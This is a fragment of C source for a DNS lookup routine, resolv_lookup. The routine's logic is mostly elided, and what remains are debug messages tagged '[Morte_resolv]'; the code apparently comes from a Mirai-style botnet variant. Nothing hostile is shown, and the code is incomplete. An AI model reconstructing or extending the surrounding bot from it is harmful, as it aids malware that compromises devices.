...
struct resolv_entries *resolv_lookup(char *domain)
{
    ...
    while (tries++ < 5)
    {
        ...
        {
#ifdef DEBUG
            printf("[Morte_resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[Morte_resolv] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[Morte_resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[Morte_resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[Morte_resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        ...
        {
#ifdef DEBUG
            printf("[Morte_resolv] Got response from select\n");
#endif
...
#ifdef DEBUG
                        printf("[Morte_resolv] Found IP address: %08x\n", (*p));
#endif
                    }
...
#ifdef DEBUG
    printf("[Morte_resolv] Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif
